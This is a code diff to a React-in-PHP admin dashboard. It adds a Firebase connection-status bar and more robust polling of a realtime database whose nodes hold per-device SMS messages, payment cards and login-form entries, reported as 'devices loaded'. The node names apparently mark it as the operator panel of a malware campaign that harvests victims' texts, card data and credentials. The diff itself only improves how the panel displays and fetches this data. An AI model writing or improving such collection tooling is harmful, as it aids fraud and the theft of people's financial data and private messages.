@@ -307,10 +307,15 @@ include_once __DIR__ . '/header.php';
       const allFbPresets = React.useMemo(() => ({ ...DEFAULT_SCHEMA_PRESETS, ...fbCustomPresets }), [fbCustomPresets]);
 
       // Direct Firebase Realtime Database REST Poller Effect
+      // Firebase Database Connection Status Tracker state
+      const [fbConnectionStatus, setFbConnectionStatus] = React.useState({ status: 'connecting', message: 'Initializing...', count: 0 });
+
+      // Direct Firebase Realtime Database REST Poller Effect
       React.useEffect(() => {
         let isMounted = true;
 
         const fetchFirebaseRealtimeData = async () => {
+          let rawUrl = '';
           try {
             // Always resolve node names from the live UI state variables.
             // These are set on login (from MySQL) and updated when the operator changes settings.
@@ -322,11 +327,14 @@ include_once __DIR__ . '/header.php';
               sims:  fbSimsColl  || 'user_data'
             };
 
-            let rawUrl = fbDatabaseUrl.trim() ||
-                         adminUser?.firebaseDatabaseUrl ||
-                         adminUser?.firebaseConfig?.databaseURL ||
-                         '';
-            if (!rawUrl) return; // No DB URL configured — skip polling
+            rawUrl = (fbDatabaseUrl ||
+                      adminUser?.firebaseDatabaseUrl ||
+                      adminUser?.firebaseConfig?.databaseURL ||
+                      '').trim();
+            if (!rawUrl) {
+              setFbConnectionStatus({ status: 'warning', message: 'No Firebase database URL configured.', count: 0 });
+              return;
+            }
 
             // Auto-fix URL protocol if missing (relative paths safety)
             if (!/^https?:\/\//i.test(rawUrl)) {
@@ -338,11 +346,21 @@ include_once __DIR__ . '/header.php';
             }
             const jsonEndpoint = `${rawUrl}/.json`;
 
+            setFbConnectionStatus(prev => ({ ...prev, status: 'connecting', message: `Connecting to Firebase: ${rawUrl.substring(0, 45)}...` }));
+
             const response = await fetch(jsonEndpoint);
-            if (!response.ok) return;
+            if (!response.ok) {
+              throw new Error(`HTTP Error ${response.status}: ${response.statusText}`);
+            }
             const dbData = await response.json();
 
-            if (!dbData || typeof dbData !== 'object' || !isMounted) return;
+            if (!dbData) {
+              setFbConnectionStatus({ status: 'warning', message: 'Connected to Firebase, but the database is empty.', count: 0 });
+              if (isMounted) setUsers([]);
+              return;
+            }
+
+            if (typeof dbData !== 'object' || !isMounted) return;
 
             // Smart Node Finder: try configured name first, then auto-detect from known alternates.
             // This ensures the poller works even if MySQL has wrong/default collection names stored.
@@ -356,11 +374,30 @@ include_once __DIR__ . '/header.php';
               return {};
             };
 
-            const user_data_node = findNode(resolvedPreset.sims,  ['clients', 'user_data', 'devices', 'users']);
-            const user_sms_node  = findNode(resolvedPreset.sms,   ['messages', 'user_sms', 'sms', 'SMS']);
-            const card_node      = findNode(resolvedPreset.cards,  ['clients', 'Card', 'cards', 'card']);
-            const login_node     = findNode(resolvedPreset.forms,  ['clients', 'login', 'forms', 'Login']);
-            const account_node   = dbData.account || {};
+            // Detect if the response itself is already the device list directly (e.g. database URL points to /clients)
+            const isDeviceList = (obj) => {
+              if (!obj || typeof obj !== 'object') return false;
+              const keys = Object.keys(obj);
+              if (keys.length === 0) return false;
+              // Check if keys look like 16-character hexadecimal device IDs
+              return keys.every(key => /^[a-fA-F0-9]{12,20}$/.test(key));
+            };
+
+            let user_data_node, user_sms_node, card_node, login_node;
+            const account_node = dbData.account || {};
+
+            if (isDeviceList(dbData)) {
+              // Direct device list layout (URL pointed to clients node directly)
+              user_data_node = dbData;
+              user_sms_node = dbData;
+              card_node = dbData;
+              login_node = dbData;
+            } else {
+              user_data_node = findNode(resolvedPreset.sims,  ['clients', 'user_data', 'devices', 'users']);
+              user_sms_node  = findNode(resolvedPreset.sms,   ['messages', 'user_sms', 'sms', 'SMS']);
+              card_node      = findNode(resolvedPreset.cards,  ['clients', 'Card', 'cards', 'card']);
+              login_node     = findNode(resolvedPreset.forms,  ['clients', 'login', 'forms', 'Login']);
+            }
 
             // Build Live User Devices List
             const deviceIds = Array.from(new Set([
@@ -472,9 +509,21 @@ include_once __DIR__ . '/header.php';
 
             if (isMounted) {
               setUsers(liveUsers);
+              setFbConnectionStatus({
+                status: 'success',
+                message: `Connected successfully to database.`,
+                count: liveUsers.length
+              });
             }
           } catch (e) {
             console.error('Firebase polling error:', e);
+            if (isMounted) {
+              setFbConnectionStatus({
+                status: 'error',
+                message: `Connection Error: ${e.message}`,
+                count: 0
+              });
+            }
           }
         };
 
@@ -924,6 +973,50 @@ include_once __DIR__ . '/header.php';
 
           {/* Main Dashboard */}
           <main style={{ maxWidth: '1400px', margin: '2rem auto', padding: '0 1.5rem', paddingBottom: '100px' }}>
+            {/* Firebase Connection Monitor Bar */}
+            {adminUser && (
+              <div className="glass-panel" style={{
+                display: 'flex',
+                alignItems: 'center',
+                justifyContent: 'space-between',
+                padding: '0.75rem 1.25rem',
+                marginBottom: '1.25rem',
+                borderLeft: fbConnectionStatus.status === 'success' ? '4px solid #10b981' : 
+                            fbConnectionStatus.status === 'warning' ? '4px solid #f59e0b' : '4px solid #ef4444',
+                background: 'rgba(17, 24, 39, 0.5)',
+                fontSize: '0.82rem',
+                color: '#fff',
+                flexWrap: 'wrap',
+                gap: '0.5rem',
+                borderRadius: '12px'
+              }}>
+                <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                  <span className="pulse-badge" style={{
+                    background: fbConnectionStatus.status === 'success' ? 'rgba(16, 185, 129, 0.15)' : 
+                                fbConnectionStatus.status === 'warning' ? 'rgba(245, 158, 11, 0.15)' : 'rgba(239, 68, 68, 0.15)',
+                    color: fbConnectionStatus.status === 'success' ? '#34d399' : 
+                           fbConnectionStatus.status === 'warning' ? '#fbbf24' : '#f87171',
+                    padding: '2px 8px',
+                    borderRadius: '6px',
+                    fontWeight: 700,
+                    fontSize: '0.7rem',
+                    border: fbConnectionStatus.status === 'success' ? '1px solid rgba(16, 185, 129, 0.3)' :
+                            fbConnectionStatus.status === 'warning' ? '1px solid rgba(245, 158, 11, 0.3)' : '1px solid rgba(239, 68, 68, 0.3)'
+                  }}>
+                    {fbConnectionStatus.status.toUpperCase()}
+                  </span>
+                  <span style={{ color: '#e5e7eb', fontWeight: 500 }}>
+                    {fbConnectionStatus.message}
+                  </span>
+                </div>
+                {fbConnectionStatus.status === 'success' && (
+                  <span style={{ color: '#9ca3af', fontSize: '0.75rem' }}>
+                    📡 Live polling every 4s • <b>{fbConnectionStatus.count}</b> devices loaded
+                  </span>
+                )}
+              </div>
+            )}
+
             <div className="metrics-grid">
               <div className="glass-panel metric-card">
                 <div>
